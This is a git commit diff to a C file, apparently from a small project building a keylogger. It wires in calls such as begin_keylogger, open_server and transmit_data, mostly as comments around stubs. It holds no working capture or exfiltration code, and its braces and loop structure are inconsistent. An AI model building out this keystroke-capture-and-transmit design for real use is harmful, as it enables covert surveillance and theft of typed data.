1aa18ce604401138aa3bc3fe9561357e8423d165
Lily Jiang <ljiang@olin.edu>
2023-05-03 01:49:16 -0400

    integrate keylogging with main function

--- src/main.c
+++ src/main.c
@@ -11,6 +11,11 @@ void background_process(void) {
 #include <unistd.h>
 #include <sys/types.h>
 #include <stdio.h>
+
+void background_process(void) {
+  // implementation here
+}
+
 void main(void) {
   // background_process();
   // begin_keylogger();
@@ -21,6 +26,14 @@ void main(void) {
   //   transmit_data();
     //printf("%d\n",(int)my_pid);
     sleep(1);
+  }
+  end_keylogger();
+  close_server();
+  // background_process();
+  // begin_keylogger();
+  // open_server();
+  // while (1) {
+  //   transmit_data();
   // }
   // end_keylogger();
   // close_server();
@@ -29,5 +42,4 @@ void main(void) {
   key_package.keys_arr_size = 0;
   log_device(&key_package);
   log_keys(&key_package);
-  print_logged_keys(key_package);
 }
